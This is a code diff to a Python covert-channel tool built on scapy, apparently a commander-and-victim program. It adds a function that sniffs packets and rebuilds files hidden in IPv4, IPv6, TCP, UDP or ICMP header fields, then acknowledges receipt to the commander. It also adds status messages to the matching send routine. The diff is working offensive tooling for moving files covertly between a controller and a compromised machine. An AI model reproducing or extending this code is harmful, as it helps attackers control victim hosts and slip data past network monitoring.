@@ -6,7 +6,7 @@ import socket
 import sys
 import time
 from scapy.layers.inet6 import IPv6
-from scapy.sendrecv import send
+from scapy.sendrecv import send, sniff
 import constants
 import importlib
 import inotify.adapters
@@ -332,6 +332,7 @@ def get_packet_count(client_socket: socket):
 
 def __bytes_to_bin(data):
     return ''.join(format(byte, constants.BINARY_MODE) for byte in data)
+
 
 # ===================== IPV4 EXTRACT COVERT DATA FUNCTIONS =====================
 
@@ -1320,6 +1321,123 @@ def get_protocol_header_function_extract_map():
         ("ICMP", "Identifier"): extract_data_icmp_identification,
         ("ICMP", "Sequence Number"): extract_data_icmp_seq_num,
     }
+
+
+def receive_file_covert(cmdr_socket: socket.socket, cmdr_ip: str,
+                        cmdr_port: int, source_ip: str,
+                        source_port: int, choices: tuple, filename: str):
+    # Initialize Variables
+    received_packets = []
+
+    # Print configuration
+    print(constants.RECEIVING_FILE_MSG.format(filename))
+    print(constants.COVERT_CONFIGURATION_FROM_CMDR.format(choices[0], choices[1]))
+    print(constants.COVERT_DATA_PACKET_LOCATION_MSG.format(choices[0], choices[1]))
+
+    # Get function handler from a map (according to header/field)
+    header_field_function_map = get_protocol_header_function_extract_map()
+    if choices in header_field_function_map:
+        selected_function = header_field_function_map.get(choices)
+
+    # A callback function for handling of received packets
+    def packet_callback(packet):
+        global filename
+        binary_data = selected_function(packet)
+        return binary_data
+
+    # DIFFERENT SNIFFS: For IPv4 Headers/Field
+    if constants.IPV4 in choices:
+        # Get total count of packets
+        count = get_packet_count(cmdr_socket)
+
+        if constants.SOURCE_ADDRESS_FIELD in choices:
+            received_packets = sniff(filter="dst host {} and dst port {}"
+                                     .format(source_ip, source_port), count=count)
+        else:  # REGULAR IPv4 SNIFF
+            received_packets = sniff(filter="src host {}".format(cmdr_ip), count=count)
+
+    # DIFFERENT SNIFFS: For IPv6 Headers/Field
+    if constants.IPV6 in choices:
+        source_ipv6_ip, source_ipv6_port, cmdr_ipv6_addr = receive_get_ipv6_script(cmdr_socket,
+                                                                                   cmdr_ip,
+                                                                                   cmdr_port)
+
+        # Get total count of packets
+        count = get_packet_count(cmdr_socket)
+
+        if constants.NEXT_HEADER in choices:
+            received_packets = sniff(filter="src host {} and dst host {}"
+                                     .format(cmdr_ipv6_addr, source_ipv6_ip),
+                                     count=count)
+        else:
+            received_packets = sniff(filter="dst host {} and dst port {}"
+                                     .format(source_ipv6_ip, source_ipv6_port),
+                                     count=count)
+
+    # DIFFERENT SNIFFS: For TCP Headers/Field
+    if constants.TCP in choices:
+        count = get_packet_count(cmdr_socket)
+
+        if constants.SOURCE_PORT_FIELD in choices:
+            received_packets = sniff(filter="tcp and dst host {} and dst port {} and "
+                                            "(tcp[13] & 0x004 == 0)"  # tcp[13] offset RST flag (0x004)
+                                     .format(source_ip, source_port),
+                                     count=count)
+
+        elif constants.DESTINATION_PORT_FIELD in choices:
+            received_packets = sniff(filter="tcp and dst host {} and src host {} and "
+                                            "(tcp[13] & 0x004 == 0)"
+                                     .format(source_ip, cmdr_ip),
+                                     count=count)
+
+        elif constants.FLAG in choices:  # Capture all flags
+            received_packets = sniff(filter="tcp and dst host {} and dst port {}"
+                                     .format(source_ip, source_port),
+                                     count=count)
+        else:
+            received_packets = sniff(filter="tcp and dst host {} and dst port {} "
+                                            "and tcp[13] & 0x004 == 0"
+                                     .format(source_ip, source_port),
+                                     count=count)
+
+    # DIFFERENT SNIFFS: For UDP Headers/Field
+    if constants.UDP in choices:
+        count = get_packet_count(cmdr_socket)
+
+        if constants.DESTINATION_PORT_FIELD in choices:
+            received_packets = sniff(filter="udp and dst host {} and src host {}"
+                                     .format(source_ip, cmdr_ip),
+                                     count=count)
+        else:
+            received_packets = sniff(filter="udp and dst host {} and dst port {}"
+                                     .format(source_ip, source_port),
+                                     count=count)
+
+    # DIFFERENT SNIFFS: For ICMP Header/Fields
+    if constants.ICMP in choices:
+        count = get_packet_count(cmdr_socket)
+
+        received_packets = sniff(filter="icmp and dst host {} and src host {}"
+                                 .format(source_ip, cmdr_ip),
+                                 count=count)
+
+    # Extract Data
+    extracted_data = ''.join(packet_callback(packet)
+                             for packet in received_packets if packet_callback(packet))
+
+    # Write Data to File
+    covert_data_write_to_file(extracted_data, filename)
+
+    # Send ACK to commander (if good)
+    if is_file_openable(filename):
+        print(constants.TRANSFER_SUCCESS_MSG.format(filename))
+        print(constants.AWAIT_NEXT_OP_MSG)
+        print(constants.MENU_CLOSING_BANNER)
+        cmdr_socket.send(constants.VICTIM_ACK.encode())
+    else:
+        cmdr_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
+        print(constants.AWAIT_NEXT_OP_MSG)
+        print(constants.MENU_CLOSING_BANNER)
 
 
 # ================== COVERT FILE TRANSFER TO CMDR FUNCTIONS ==================
@@ -3578,5 +3696,17 @@ def transfer_file_covert(sock: socket.socket, dest_ip: str,
         print(constants.FILE_TRANSFER_SUCCESSFUL.format(file_path,
                                                         dest_ip,
                                                         dest_port))
+        print(constants.AWAIT_NEXT_OP_MSG)
+        print(constants.MENU_CLOSING_BANNER)
     else:
         print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
+        print(constants.AWAIT_NEXT_OP_MSG)
+        print(constants.MENU_CLOSING_BANNER)
+
+
+def transfer_file_covert_helper_print_config(file_path: str, header: str, field: str):
+    print(constants.GET_FILE_CMDR_PATH.format(file_path))
+    print(constants.GET_FILE_FOUND_MSG.format(file_path))
+    print(constants.GET_FILE_INIT_MSG.format(file_path))
+    print(constants.COVERT_CONFIGURATION_FROM_CMDR.format(header, field))
+    print(constants.COVERT_DATA_PACKET_LOCATION_MSG.format(header, field))
